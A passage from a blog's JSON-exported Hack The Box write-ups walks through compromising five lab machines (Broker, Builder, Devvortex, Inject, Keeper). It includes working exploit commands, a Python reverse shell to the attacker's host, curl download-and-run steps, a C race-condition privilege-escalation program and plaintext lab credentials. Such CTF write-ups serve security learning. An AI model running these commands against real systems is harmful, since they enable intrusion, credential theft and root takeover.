
[{"content":"Broker is an easy difficulty Linux machine hosting a version of Apache ActiveMQ. Enumerating the version of Apache ActiveMQ shows that it is vulnerable to Unauthenticated Remote Code Execution, which is leveraged to gain user access on the target. Post-exploitation enumeration reveals that the system has a sudo misconfiguration allowing the activemq user to execute sudo /usr/sbin/nginx, which is similar to the recent Zimbra disclosure and is leveraged to gain root access.\nInitial Recon # \u0026gt; ping -c 1 10.10.11.243 PING 10.10.11.243 (10.10.11.243) 56(84) bytes of data. 64 bytes from 10.10.11.243: icmp_seq=1 ttl=63 time=139 ms --- 10.10.11.243 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 139.019/139.019/139.019/0.000 ms we start our scanning with nmap:\n\u0026gt; sudo nmap -sC -sV -oA broker 10.10.11.243 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA) |_ 256 64:cc:754a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Error 401 Unauthorized | http-auth: | HTTP/1.1 401 Unauthorized\\x0D |_ basic realm=ActiveMQRealm |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel In our result we can see 2 ports.\nPort Service Product Version 22 ssh OpenSSH 8.9p1 80 HTTP nginx 1.18.0 For now we do not try anything through ssh since we do not have valid credentials, So let’s look at the website.\nLogin # As soon as I entered the website, it asked me for credentials, I tried admin:admin and magically it let me in.\nWe have a website with activeMQ.\nWhat is activemq? Apache ActiveMQ is an open source message broker written in Java together with a full Java Message Service client. It provides “Enterprise Features” which in this case means fostering the communication from more than one client or server.\nIf we go to the section that says Manage ActiveMQ broker we can see more information.\nWeb # CVE-2023-46604 Exploit # We searched for ActiveMQ 5.15.15 exploit CVE and found an interesting exploit:\nCVE-2023-46604\nwe clone this exploit:\n\u0026gt; git clone https://github.com/evkl1d/CVE-2023-46604 \u0026gt; cd CVE-2023-46604 We listen on port 6666:\nnc -nlvp 6666 and we edit the poc.xml that contains the exploit folder that we cloned. The line you are going to edit needs your IP of the tun0 interface and the port you are listening on, to receive the shell there.\nWe create a server in python in which the exploit will take the poc.xml to attack the website.\nWe run the exploit as follows:\n\u0026gt; python3 exploit.py -i 10.10.11.243 -u \u0026#39;http://10.10.14.26/poc.xml\u0026#39; In the -u parameter we put the Python Server that we made previously.\nDid you understand what I did? I explain to you Basically, we copied an exploit from github, which is dedicated for this activeMQ Vulnerability.\nin the exploit’s usage guide, it tells us that we need to create a python server which we will assign to it when we execute the attack, so that it loads the poc.xml file on the page with our IP and port on which we are already listening for receive our Revshell.\nPrivilege Escalation # If we put the command sudo -l it shows us this:\n\u0026gt; sudo -l Matching Defaults entries for activemq on broker: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User activemq may run the following commands on broker: (ALL : ALL) NOPASSWD: /usr/sbin/nginx Nginx Sudo - Read root flag # sudo -l is used to check the privileges a user has on a Unix or Linux system via the sudo command.\nOkay, We can run nginx with sudo privileges without a password, Let’s deep search how we can do that.\nAfter search, i want now to create a configration file but first we need to see nginx.conf from this path /etc/nginx/nginx.conf.\nI’ll edit this file from my machine and upload on the box.\nuser root; worker_processes auto; events { worker_connections 790; } http{ server { listen 9000; location / { root /; } } } To set configuration file use this command.\n\u0026gt; sudo nginx -c /tmp/nginx1.conf \u0026gt; ss -ltnp # displays TCP connections with a source port Now we can access root flag.\ncurl http://localhost:9000/root/root.txt Thanks for reading.\n","date":"25 January 2022","externalUrl":null,"permalink":"/writeups/1.-broker/","section":"Hackthebox Writeups","summary":"Learn more about me and why I am starting this blog.","title":"Broker Writeup","type":"writeups"},{"content":" Initial Recon # We start our scans with nmap.\n\u0026gt; sudo nmap 10.10.11.10 -sS -p- --open -n -Pn --min-rate 3000 -vvv -oG ports PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 8080/tcp open http-proxy syn-ack ttl 62 \u0026gt; nmap -p8080,22 10.10.11.10 -sVC PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA) |_ 256 64:cc:75:De:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519) 8080/tcp open http Jetty 10.0.18 |_http-title: Dashboard [Jenkins] |_http-server-header: Jetty(10.0.18) | http-open-proxy: Potentially OPEN proxy. |_Methods supported:CONNECTION | http-robots.txt: 1 disallowed entry |_/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel We only have 2 ports, let’s see the website.\nWeb # We look at versions:\n\u0026gt; whatweb http://10.10.11.10:8080/ http://10.10.11.10:8080/ [200 OK] Cookies[JSESSIONID.678bd8a0], Country[RESERVED][ZZ], HTML5, HTTPServer[Jetty(10.0.18)], HttpOnly[JSESSIONID.678bd8a0], IP[10.10.11.10], Jenkins[2.441], Jetty[10.0.18], OpenSearch[/opensearch.xml], Script[application/json,text/javascript], Title[Dashboard [Jenkins]], UncommonHeaders[x-content-type-options,x-hudson-theme,referrer-policy,cross-origin-opener-policy,x-hudson,x-jenkins,x-jenkins-session,x-instance-identity], X-Frame-Options[sameorigin] Search for the version of Jenkins that we found on the web. Jenkins 4.441 exploit\nCVE-2024-23897 - Jenkins Arbitrary File Leak Vulnerability # Download the .jar file of the vulnerable jenkins\nwget http://10.10.11.10:8080/jnlpJars/jenkins-cli.jar Here you have more information about this:\nhttps://www.zscaler.com/blogs/security-research/jenkins-arbitrary-file-leak-vulnerability-cve-2024-23897-can-lead-rce\nList the /etc/passwd of the victim machine.\njava -jar jenkins-cli.jar -s http://10.10.11.10:8080 connect-node \u0026#39;@/etc/passwd\u0026#39; Directory Structure for Jenkins # Here i share information about the order of Jenkins directories:\nhttps://medium.com/@knoldus/directory-structure-and-installing-plugins-in-jenkins-3dd62488631c\nWe look for the username:\njava -jar jenkins-cli.jar -noCertificateCheck -s \u0026#39;http://10.10.11.10:8080\u0026#39; connect-node \u0026#34;@/var/jenkins_home/users/users.xml\u0026#34; :: Cada lugar tiene su config.xml\nEach user tine un config.xml file, let’s see it:\njava -jar jenkins-cli.jar -noCertificateCheck -s \u0026#39;http://10.10.11.10:8080\u0026#39; connect-node \u0026#34;@/var/jenkins_home/users/jennifer_12108429903186576833/config.xml\u0026#34; We find a hash in the file:\nWe cracked it with john:\nLogin in Jenkins # Let us log in with the credentials found.\nJenkins credentials — jennifer : princess\nPrivilege Escalation # If we go to the \u0026gt; Manage Jenkins \u0026gt; Credentials \u0026gt; System \u0026gt; Global Crendentials (UNrestricted)\nIf we inspect above the key, we can see that the ssh key is encrypted.\nHow to Print Password Encryption Jenkins # We print the key in the Jenkins Console with the following command that we found on this website:\nhttps://stackoverflow.com/questions/25547381/what-password-encryption-jenkins-is-using\nprintln(hudson.util.Secret.fromString(\u0026#34;{encrypt hash}\u0026#34;)) and now as usual, we save the key and give it permissions\nchmod 600 id_rsa ssh -i id_rsa root@10.10.11.10 ","date":"25 January 2022","externalUrl":null,"permalink":"/writeups/13.-builder/","section":"Hackthebox Writeups","summary":"Initial Recon # We start our scans with nmap.","title":"Builder Writeup","type":"writeups"},{"content":" Initial Recon # We start our scanning with nmap:\n\u0026gt; sudo nmap 10.10.11.242 -sS --open --min-rate 3000 -p- -n -Pn -oN Nmapscan PORT STATE SERVICE 22/tcp open ssh 80/tcp open http \u0026gt; nmap -p22,80 -sVC 10.10.11.242 -Pn -oN versionScan PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA) | 256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA) |_ 256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://devvortex.htb/ |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel we only have 2 open ports, so let’s look at the website\nWeb # After searching the entire web, i fuzz subdomains:\n\u0026gt; gobuster vhost -u http://devvortex.htb -w /usr/share/SecLists/Discovery/Web-Content/common.txt Found: dev.devvortex.htb (Status: 200) [Size: 23221 we fond another website:\nWhen seeing the technologies of the web, we try to do fuzzing to find the joomla login panel.\n\u0026gt; gobuster dir -u http://dev.devvortex.htb -w /usr/share/SecLists/Discovery/Web-Content/common.txt /robots.txt (Status: 200) [Size: 764] /README.txt (Status: 200) [Size: 764] /administrator (Status: 301) [Size: 178] [--\u0026gt; http://dev.devvortex.htb/administrator/] /api (Status: 301) [Size: 178] [--\u0026gt; http://dev.devvortex.htb/api/] /api/experiments (Status: 406) [Size: 29] /api/experiments/configurations (Status: 406) [Size: 29] /cache (Status: 301) [Size: 178] [--\u0026gt; http://dev.devvortex.htb/cache/] in the README.txt we see the following:\nhttp://dev.devvortex.htb/README.txt\nHere is the version, let’s look for vulnerabilities or exploits.\nSearch: Joomla 4.2 exploit\nCVE-2023-23752 - Exploit # We found an interesting exploit:\nExploit DB - CVE-2023-23752 We download the exploit and install the necessary libraries\n\u0026gt; sudo gem install docopt httpx json paint When executing the exploit we have the following results:\nruby exploit.rb http://dev.devvortex.htb CVE-2023-23752 - Manual # We will run the same vulnerability, but manually, to better understand this:\nhttps://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#api-unauthenticated-information-disclosure\ncurl -s \u0026#39;http://dev.devvortex.htb/api/index.php/v1/config/application?public=true\u0026#39; | ./jq-linux-amd64 | grep -E \u0026#39;user|password\u0026#39; We also found information that could be useful to us in the same file\nCVE-2023-23752 - My Script # I have also created a script for this, so you have more options: https://github.com/mil4ne/CVE-2023-23752-Joomla-v4.2.8/\nWith these credentials we try to log in to the Joomla panel.\nGet shell # once inside, we go to the system section.\nNow we just have to edit one of the web or panel files and put php revshell in them, we will use this:\nWe access the file we edited, to receive the shell to our listening port\nnc -nlvp 9001 listening on [any] 9001 ... connect to [10.10.14.145] from (UNKNOWN) [10.10.11.242] 41690 Linux devvortex 5.4.0-167-generic #184-Ubuntu SMP Tue Oct 31 09:21:49 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux 15:47:51 up 4:52, 0 users, load average: 0.57, 0.34, 0.13 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT uid=33(www-data) gid=33(www-data) groups=33(www-data) sh: 0: can\u0026#39;t access tty; job control turned off $ id uid=33(www-data) gid=33(www-data) groups=33(www-data) Lateral Movement # Mysql Database # Previously we had seen that there was a mysql database, so we tried to connect:\n\u0026gt; mysql -u lewis -p show databases; use joomla; show tables; select * from sd4fg_users After looking at all the contents of the database, we find the following hash of user logan:\nlogan:$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12\nCrack Hash # We identify the hash and crack with john\nwe move to the user logan\n\u0026gt; su logan Privilege Escalation # logan@devvortex:~$ sudo -l [sudo] password for logan: Matching Defaults entries for logan on devvortex: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User logan may run the following commands on devvortex: (ALL : ALL) /usr/bin/apport-cli CVE-2023–1326 - Privilege Escalation - apport-cli 2.26.0 # In this part I am going to show you 2 ways to escalate privileges:\napport-cli Privilege Escalation\nwe create a sh file and run it with the apport-cli\nlogan@devvortex:/tmp$ echo \u0026#39;Hello apport-cli\u0026#39; \u0026gt; exp.sh logan@devvortex:/tmp$ chmod +x exp.sh logan@devvortex:/tmp$ sudo apport-cli -c exp.sh less We select V for the option to view report and when it says ‘:’, we insert the shell !/bin/bash\nWhat would you like to do? Your options are: S: Send report (1.6 KB) V: View report K: Keep report file for sending later or copying to somewhere else I: Cancel and ignore future crashes of this program version C: Cancel Please choose (S/V/K/I/C): V \u0026lt;HERE YOU GET \u0026#34;less\u0026#34; command output type \u0026#34;!/bin/bash\u0026#34;\u0026gt; # id uid=0(root) gid=0(root) groups=0(root) ","date":"25 January 2022","externalUrl":null,"permalink":"/writeups/12.-devvortex/","section":"Hackthebox Writeups","summary":"Initial Recon # We start our scanning with nmap:","title":"Devvortex Writeup","type":"writeups"},{"content":"","date":"25 January 2022","externalUrl":null,"permalink":"/tags/easy/","section":"Tags","summary":"","title":"Easy","type":"tags"},{"content":"","date":"25 January 2022","externalUrl":null,"permalink":"/writeups/","section":"Hackthebox Writeups","summary":"","title":"Hackthebox Writeups","type":"writeups"},{"content":"Inject is an easy Linux machine created by rajHere on Hack The Box that involves Exploiting a Directory Traversal bug to locate and read local files as frank. We use this vulnerability to enumerate software versions involved in the web server, where we find an outdated Spring Framework installation that is vulnerable to a critical bug tracked as CVE-2022-22963. This bug is then used to gain code execution as frank, and find credentials for phil in frank’s home directory. The user phil is permitted to write Ansible playbooks to a certain directory that is used by root in scheduled CRON jobs. With a special playbook, we are then able to execute code as root and fetch the system flag\nInitial Recon # Let’s set up our environment and run a TCP port scan with this custom nmap wrapper.\n# mhil4ne@Kali (bash) rhost=\u0026#34;10.10.11.204\u0026#34; # Target IP address lhost=\u0026#34;10.10.14.4\u0026#34; # Your VPN IP address echo rhost=$rhost \u0026gt;\u0026gt; .env echo lhost=$lhost \u0026gt;\u0026gt; .env . ./.env \u0026amp;\u0026amp; ctfscan $rhost The open ports reported in the scan include:\nPort Service Product Version 22 ssh OpenSSH 8.9p1 80 HTTP Nagios NSCA Web # We’ll begin by exploring the HTTP server on port 8080 since web services are often vulnerable. Let’s also route our requests through our local BurpSuite proxy or just use BurpSuite’s built-in browser.\nThe home page introduces a few features including the ability to upload files. Let’s check out that page since file uploads are a slippery slope when it comes to security.\nWe’ll try uploading a file in our browser session while we capture the request with BurpSuite.\nPOST /upload HTTP/1.1 Host: 10.10.11.204:8080 Content-Length: 220 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAPgIHu4nfmqDyyE2 User-Agent: BurpSuite Accept: */* ------WebKitFormBoundaryAPgIHu4nfmqDyyE2 Content-Disposition: form-data; name=\u0026#34;file\u0026#34;; filename=\u0026#34;demo.txt\u0026#34; Content-Type: text/plain This is a standard UTF-8 text file... ------WebKitFormBoundaryAPgIHu4nfmqDyyE2-- The response indicates that the form exclusively accepts image files, so we’ll try uploading an image.\nThe upload is successful plus we get to view the image dynamically at the /show_image endpoint.\nFile Disclosure # t appears that the image file is loaded dynamically from the filesystem using the img parameter. Let’s see if we can read any files outside of our working directory like /etc/passwd.\n# mhil4ne@kali (bash) curl \u0026#34;http://$rhost:8080/show_image?img=../../../../../../etc/passwd\u0026#34; root:.x:0:0:root:/root:/bin/bash daemon:.x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:.x:2:2:bin:/bin:/usr/sbin/nologin ... We can seemingly use this endpoint to read local files using a generic directory traversal payload. Messing around a bit more, we find out that we can list directories as well.\n# mhil4ne@kali (bash) curl \u0026#34;http://$rhost:8080/show_image?img=../../../../../../\u0026#34; bin boot dev ... Remote Code Execution # Let’s find the application source so we can look for credentials or additional attack surface.\n# mhil4ne@kali (bash) inject_fetch() { curl -sm 1 \u0026#34;http://$rhost:8080/show_image?img=\u0026#34;$@; } inject_fetch ../ # read parent directory inject_fetch ../java # keep looking ... We eventually find what appears to be the project root for the current Java application at ../../../{:.filepath}. Within that directory, we find the Maven project configuration at pom.xml{:.filepath} containing a couple of notable software fingerprints.\norg.springframework.boot 2.6.5 spring-cloud-function-web 3.2.2 If we search for vulnerabilities with either fingerprint, we see references to a couple of different CVEs. We confirm that Spring Cloud Function version 3.2.2 is vulnerable to CVE-2022-22963 by Checking the CVEDetails description.\nIn Spring Cloud Function versions 3.1.6, 3.2.2 and older unsupported versions, when using routing functionality it is possible for a user to provide a specially crafted SpEL as a routing-expression that may result in remote code execution and access to local resources\nThere is already a number of proof-of-concept exploits out there, but I decided to create one anyways here. We’ll use this program to spawn a reverse shell that answers to a PwnCat listener.\n# mhil4ne@kali (bash) pwncat-cs -c \u0026lt;(echo \u0026#34;listen -m linux -H $lhost 443\u0026#34;) # mhil4ne@kali (bash) inject_fetch ../../../../../../usr/bin | grep \u0026#39;^python\u0026#39; # python3 is installed tmp=$(mktemp -d) cat \u0026lt;\u0026lt; EOF \u0026gt; $tmp/index.html import os,pty,socket s=socket.socket() s.connect((\u0026#34;$lhost\u0026#34;,443)) [os.dup2(s.fileno(),f)for(f)in(0,1,2)] pty.spawn(\u0026#34;bash\u0026#34;) EOF python3 -m http.server --bind $lhost --directory $tmp 80 \u0026amp; python3 CVE-2022-22963.py \u0026#34;http://$rhost:8080\u0026#34; \u0026#34;curl $lhost -o/tmp/_d\u0026#34; python3 CVE-2022-22963.py \u0026#34;http://$rhost:8080\u0026#34; \u0026#34;python3 /tmp/_d\u0026#34; We should then get a callback to our listener on port 443 as the user frank.\nPrivilege Escalation # Frank # We begin exploring the filesystem starting with frank’s home directory\n# frank@inject (bash) find ~ -type f /home/frank/.bashrc /home/frank/.m2/settings.xml ... There’s a Maven user configuration file at ~/.m2/settings.xml{:.filepath} that contains credentials for the user phil.\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;settings xmlns=\u0026#34;http://maven.apache.org/POM/4.0.0\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema-instance\u0026#34; xsi:schemaLocation=\u0026#34;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\u0026#34;\u0026gt; \u0026lt;servers\u0026gt; \u0026lt;server\u0026gt; \u0026lt;id\u0026gt;Inject\u0026lt;/id\u0026gt; \u0026lt;username\u0026gt;phil\u0026lt;/username\u0026gt; \u0026lt;password\u0026gt;DocPhillovestoInject123\u0026lt;/password\u0026gt; \u0026lt;privateKey\u0026gt;${user.home}/.ssh/id_dsa\u0026lt;/privateKey\u0026gt; \u0026lt;filePermissions\u0026gt;660\u0026lt;/filePermissions\u0026gt; \u0026lt;directoryPermissions\u0026gt;660\u0026lt;/directoryPermissions\u0026gt; \u0026lt;configuration\u0026gt;\u0026lt;/configuration\u0026gt; \u0026lt;/server\u0026gt; \u0026lt;/servers\u0026gt; \u0026lt;/settings\u0026gt; Phil # We’ll login as phil with su using the password DocPhillovestoInject123, grab the user flag, then run some simple enumeration commands.\n# phil@inject (bash) sudo -l # no luck :( id # staff group? With the id command, find that phil has membership in a custom group called staff. Let’s see if this group has any special permissions on the filesystem.\n# phil@inject (bash) find / -group staff -ls 2\u0026gt;/dev/null The most notable entry is the /opt/automation/tasks{:.nolineno} directory which grants write privileges to the staff group. Within that folder there is a read-only configuration file (playbook) for an IT automation framework known as Ansible. Since this has to do with automation, we suspect that there is a CRON job or something similar that utilizes this folder at certain intervals. We’ll use PSpy to monitor processes and find scheduled tasks.\n# mhil4ne@kali (PwnCat phil@inject) upload pspy /home/phil # phil@inject (bash) chmod +x pspy \u0026amp;\u0026amp; ./pspy | tee -a pspy.log After a couple minutes, we find a series of privileged processes running every two minutes that interact with /opt/automation/tasks{:.filepath} in a potentially unsafe manner.\n/usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml /usr/bin/ansible-playbook /opt/automation/tasks/playbook_1.yml sleep 10 /usr/bin/rm -rf /opt/automation/tasks/* /usr/bin/cp /root/playbook_1.yml /opt/automation/tasks/ The first process in question evaluates any path satisfying /opt/automation/tasks/*.yml{:.filepath} as an Ansible playbook. We should be able to get our playbook evaluated since /opt/automation/tasks{:.filepath} is writable.\nAnsible # It turns out, executing commands in an Ansible playbook is possible and well documented, meaning we should be able to escalate to root this way. We’ll just add a task that will grant the SUID bit to /bin/sh{:.filepath}, making sure that we clean up after ourselves to not ruin the box for others.\n- hosts: localhost tasks: - name: pwn ansible.builtin.shell: \u0026#34;chmod +s /bin/sh\u0026#34; # phil@inject (bash) cat \u0026lt;\u0026lt; EOF \u0026gt; /opt/automation/tasks/pwnbook.yml - hosts: localhost tasks: - name: pwn ansible.builtin.shell: chmod +s /bin/sh EOF After a couple minutes we verify that /bin/sh{:.filepath} or /bin/dash{:.filepath} have SUID, then spawn a root shell.\n# phil@inject (bash) /bin/sh -pi Alternative Solution (Bonus) # Let’s pretend that the magical wildcard used to execute our own playbook didn’t exist. Even without this, we can solve this machine by abusing a race condition in a CRON job. See, every two minutes root evaluates the playbook at /opt/automation/tasks/playbook_1.yml{:.filepath} alongside the following command:\nsleep 10 \u0026amp;\u0026amp; rm -rf /opt/automation/tasks/* \u0026amp;\u0026amp; cp /root/playbook_1.yml /opt/automation/tasks/ gantt dateFormat mm:ss axisFormat %M:%S tickInterval 2minute title Process creation flow section CRON Job Run playbook : crit, milestone, p1, 00:00, 0s Sleep : p2, 00:00, 10s Remove playbooks : milestone, p3, 00:10, 0s Copy original playbook to tasks folder : milestone, p4, 00:10, 0s CRON Wait : w, 00:00, 2m Looking at the timing of the calls from our PSpy log, we notice that the original playbook is deleted then replaced within under a second. It turns out, we can actually use the time between these actions to entirely prevent the playbook from being replaced. We do this by creating a directory at /opt/automation/tasks/playbook_1.yml{:.filepath} while the path is unclaimed. When the task attempts to populate that path, it runs into an error since a file cannot overwrite a directory no matter what the permissions are. Once the cp command fails, we’ll delete the directory and replace it with our malicious playbook, which is then evaluated after a couple minutes.\nWe just need to create a speedy compiled program that is efficient enough to time this correctly. The following Program should work nicely:\n// gcc -static ./privesc2.c -o privesc2 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #define PLAYBOOK_PATH \u0026#34;/opt/automation/tasks/playbook_1.yml\u0026#34; #define PLAYBOOK \u0026#34;- hosts: localhost\\n\u0026#34;\\ \u0026#34; tasks:\\n\u0026#34;\\ \u0026#34; - name: pwn\\n\u0026#34;\\ \u0026#34; ansible.builtin.shell: chmod +s /bin/sh\\n\u0026#34; void replace() { struct stat sb; while(1) { if (stat(PLAYBOOK_PATH, \u0026amp;sb) != 0) { if (mkdir(PLAYBOOK_PATH, 0700) == 0) { puts(\u0026#34;Swapped with directory!\u0026#34;); return; } puts(\u0026#34;Fail!\u0026#34;); sleep(110); } usleep(100); } } void plant() { FILE *file; if (file = fopen(PLAYBOOK_PATH, \u0026#34;w\u0026#34;)) { fprintf(file, \u0026#34;%s\u0026#34;, PLAYBOOK); fclose(file); } } int main(int argc, char* argv[]) { replace(); sleep(10); system(\u0026#34;rm -rf /opt/automation/tasks/playbook_1.yml\u0026#34;); plant(); puts(\u0026#34;Done!\u0026#34;); return 0; } Running the compiled executable on the target should replace the file with our malicious playbook after a couple minutes. We then wait another couple minutes and run /bin/sh -pi to spawn a root shell.\n","date":"25 January 2022","externalUrl":null,"permalink":"/writeups/2.-inject/","section":"Hackthebox Writeups","summary":".","title":"Inject Writeup","type":"writeups"},{"content":"Keeper is an Easy machine from Hack The Box challenge. Eumeration kicks off with an Nmap scan revealing SSH and HTTP services. The HTTP service runs Request Tracker 4.4.4, known for an information disclosure vulnerability via user enumeration. Default credentials for ‘root’ are found. Accessing the admin panel discloses a user’s password, ‘Welcome2023!’.\nUsing SSH with found credentials grants access to an Ubuntu system. A Keepass database and program dump are discovered, leading to the recovery of the master password ‘rødgrød med fløde’ (Danish dessert), granting access to the Keepass database. A Putty PPK file is found and converted to an RSA key, allowing SSH access as ‘root.’ This progression results in successful completion of the challenge.\nInitial Recon # We verify our connection with the machine, in case it does not respond, Check your VPN file:\n❯ ping -c 1 10.10.11.227 PING 10.10.11.227 (10.10.11.227) 56(84) bytes of data. 64 bytes from 10.10.11.227: icmp_seq=1 ttl=63 time=140 ms --- 10.10.11.227 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 140.045/140.045/140.045/0.000 ms we start our scanning with nmap:\n\u0026gt; sudo nmap -sS --open -p- --min-rate 5000 -n -Pn -v 10.10.11.227 -oG nmapScan PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Let’s perform a more in-depth scan:\nnmap -sVC -p22,80 10.10.11.227 -oN ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA) |_ 256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Port Service Product Version 22 ssh OpenSSH 8.9p1 80 HTTP nginx 1.18.0 For now we do not try anything through ssh since we do not have valid credentials, So let’s look at the website.\nWeb # Default Credentials In Tracker # When browsing to this page we are greeted with the following login page. We can see that its using Request tracker When looking online i could find that the default credentials for the root account is password Entering this password gave us access to the web application.\nWhen looking through the application we can find two interesting pages. The first being the recently opened tickets page. which discloses an issue one of the users is having. They are saying they have a crash dump in their home directory to help the admins debug their issues with keepass. This is very interesting information giving us a target to go after once we have access to the system.\nSecondly when checking out the users panel of the application we could see that the same user we noticed before in the ticket had a note on her profile. This note mentioned their default starters password. Using this password gave us access to the machine with ssh using the password Welcome2023!\nSSH Credentials # ssh lnorgaard@keeper.htb Privilege Escalation # The home folder contains a ZIP archive RT30000.zip. This must be the file relevant to the ticket we’ve seen before. Transfer it to the attacking machine and unzip it.\n\u0026gt; unzip RT30000.zip Archive: RT30000.zip inflating: KeePassDumpFull.dmp extracting: passcodes.kdbx We get the crash dump for KeePass and a KeePass database file.\nExtracting the KeePass master password # It may be possible to extract the master password from the dump file! I’ve attempted to use this Python script for the task: Keepass Dump MasterKey\n\u0026gt; python3 poc.py -d /opt/ctf/htb/keeper/KeePassDumpFull.dmp 2023-08-12 21:35:47,517 [.] [main] Opened /opt/ctf/htb/keeper/KeePassDumpFull.dmp Possible password: ●,dgr●d med fl●de There are some issues with special characters. A quick Google search for dgrd med flde reveals the name of the Danish dish – Rødgrød med fløde.\nI will use the kpcli utility to interact with the KeePass database file that we have looted.\n\u0026gt; kpcli KeePass CLI (kpcli) v3.8.1 is ready for operation. Type \u0026#39;help\u0026#39; for a description of available commands. Type \u0026#39;help \u0026lt;command\u0026gt;\u0026#39; for details on individual commands. kpcli:/\u0026gt; open passcodes.kdbx Provide the master password: ************************* #Rødgrød med fløde Error opening file: Couldn\u0026#39;t load the file passcodes.kdbx Error(s) from File::KeePass: The database key appears invalid or else the database is corrupt. kpcli:/\u0026gt; open passcodes.kdbx Provide the master password: ************************* #rødgrød med fløde kpcli:/\u0026gt; ls === Groups === passcodes/ Success! The KeePass database master password is rødgrød med fløde. Let’s find some credentials.\nSSH Private Key for root # kpcli:/\u0026gt; ls * === Groups === eMail/ General/ Homebanking/ Internet/ Network/ Recycle Bin/ Windows/ kpcli:/\u0026gt; ls */* /passcodes/eMail: /passcodes/General: /passcodes/Homebanking: /passcodes/Internet: /passcodes/Network: === Entries === 0. keeper.htb (Ticketing Server) 1. Ticketing System /passcodes/Recycle Bin: === Entries === 2. Sample Entry keepass.info 3. Sample Entry #2 keepass.info/help/kb/testform. /passcodes/Windows: kpcli:/\u0026gt; cd /passcodes/Network kpcli:/passcodes/Network\u0026gt; ls === Entries === 0. keeper.htb (Ticketing Server) 1. Ticketing System kpcli:/passcodes/Network\u0026gt; show -f 0 Title: keeper.htb (Ticketing Server) Uname: root Pass: \u0026lt;REDACTED\u0026gt; URL: Notes: PuTTY-User-Key-File-3: ssh-rsa Encryption: none Comment: rsa-key-20230519 Public-Lines: 6 AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D \u0026lt;REDACTED\u0026gt; It looks like we have a root SSH private key for PuTTY! Let’s convert it to the OpenSSH-acceptable format with puttygen:\nputtygen key.putty -O private-openssh -o id_rsa And use the key to SSH:\n\u0026gt; ssh root@keeper.htb -i id_rsa \u0026gt; id uid=0(root) gid=0(root) groups=0(root) ","date":"25 January 2022","externalUrl":null,"permalink":"/writeups/3.-keeper/","section":"Hackthebox Writeups","summary":"Keeper is an Easy machine from Hack The Box challenge.","title":"Keeper Writeup","type":"writeups"},{"content":"","date":"25 January 2022","externalUrl":null,"permalink":"/tags/medium/","section":"Tags","summary":"","title":"Medium","type":"tags"},{"content":"","date":"25 January 2022","externalUrl":null,"permalink":"/","section":"Mil4ne's Blog","summary":"","title":"Mil4ne's Blog","type":"page"},{"content":" Initial Recon # We check the connection with the victim machine:\n\u0026gt; ping -c 1 10.10.11.211 PING 10.10.11.211 (10.10.11.211) 56(84) bytes of data. 64 bytes from 10.10.11.211: icmp_seq=1 ttl=63 time=264 ms --- 10.10.11.211 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 263.775/263.775/263.775/0.000 ms We run our scan with nmap:\n\u0026gt; nmap -sS -p- --open --min-rate 2000 -Pn -n 10.10.11.211 -oG scan Starting Nmap 